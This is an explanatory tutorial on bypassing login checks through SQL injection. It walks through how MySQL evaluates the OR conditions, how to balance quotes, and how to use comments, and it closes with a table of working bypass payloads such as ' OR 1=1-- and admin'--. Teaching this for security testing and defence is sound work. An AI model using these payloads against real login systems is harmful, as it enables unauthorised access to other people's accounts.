# Subverting Query Logic

Authentication bypass through SQL injection is the most immediately demonstrable impact of the vulnerability. It works by manipulating the boolean logic of the WHERE clause so the database returns rows regardless of what credentials were provided.

***

## Detecting the Injection Point

Before attempting bypass, confirm the input field is vulnerable. Submitting a single quote `'` into the username field causes a syntax error if the application is vulnerable:

```sql
-- Input: '
SELECT * FROM logins WHERE username=''' AND password = 'something';
--                                    ^ odd number of quotes = syntax error
```

A visible SQL error or a change in page behaviour (blank page, different error message) confirms the input is being passed directly into the query without sanitisation. A generic "Login Failed" response with no error means either the input is sanitised or errors are suppressed.

***

## OR Injection for Authentication Bypass

The goal is to make the WHERE clause evaluate to true for at least one row, regardless of the actual credentials supplied. The OR operator achieves this because MySQL evaluates AND before OR, which can be used to construct a condition that always succeeds.

### When the Username is Known

```sql
-- Input: admin' or '1'='1
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

The evaluation order:
1. AND evaluates first: `'1'='1' AND password='something'` = `TRUE AND FALSE` = `FALSE`
2. OR evaluates next: `username='admin' OR FALSE`
3. If `admin` exists in the table, the condition returns true and login succeeds

### When the Username is Unknown

Inject into the password field instead:

```sql
-- Username: anything | Password: something' or '1'='1
SELECT * FROM logins WHERE username='anything' AND password='something' or '1'='1';
```

1. AND evaluates first: `username='anything' AND password='something'` = `FALSE`
2. OR evaluates next: `FALSE OR '1'='1'` = `TRUE`
3. The entire WHERE clause is true, all rows returned, first user logged in

### The Simplest Universal Bypass

```sql
-- Username: ' or '1'='1  | Password: anything
SELECT * FROM logins WHERE username='' or '1'='1' AND password='anything';
```

No valid username needed. The `'1'='1'` condition is always true and, combined with OR, bypasses the entire check.

***

## Why Quote Balancing Matters

The payloads above use `'1'='1` rather than `'1'='1'` deliberately. The original query already has a trailing single quote after the input position. Using `'1'='1` leaves that quote to close the expression naturally:

```sql
-- Original template: ...WHERE username='INPUT' AND...
-- Injected:          ...WHERE username='admin' or '1'='1' AND...
--                                                         ^ this quote closes '1'='1
```

If you added a closing quote yourself, you would end up with an odd number of quotes and a syntax error, defeating the injection.

***

## Comment-Based Bypass

An alternative that does not require quote balancing uses SQL comments to discard everything after the injection point:

```sql
-- Input: admin'--
SELECT * FROM logins WHERE username='admin'-- ' AND password='anything';
-- Everything after -- is a comment, password check never executes
```

MySQL comment syntax:

| Syntax | Usage |
|--------|-------|
| `--` (two dashes + space) | Inline comment, discards rest of line |
| `#` | MySQL-specific inline comment |
| `/*comment*/` | Block comment |

The space after `--` is required in standard MySQL. In URL contexts, `--+` is commonly used because `+` encodes as a space.

***

## Common Auth Bypass Payloads

| Payload | Where to Inject | Effect |
|---------|----------------|--------|
| `' OR '1'='1` | Username or password | Always-true OR condition |
| `' OR 1=1--` | Username | Comments out password check |
| `admin'--` | Username | Bypasses password for known user |
| `' OR 1=1#` | Username | MySQL-specific comment variant |
| `') OR ('1'='1` | Username (parenthesised query) | For queries with extra brackets |

The parenthesised variant handles queries structured as `WHERE (username='INPUT' AND password='INPUT')`, where you need to close the bracket before injecting OR. Identifying the exact query structure from error messages tells you which payload shape to use.
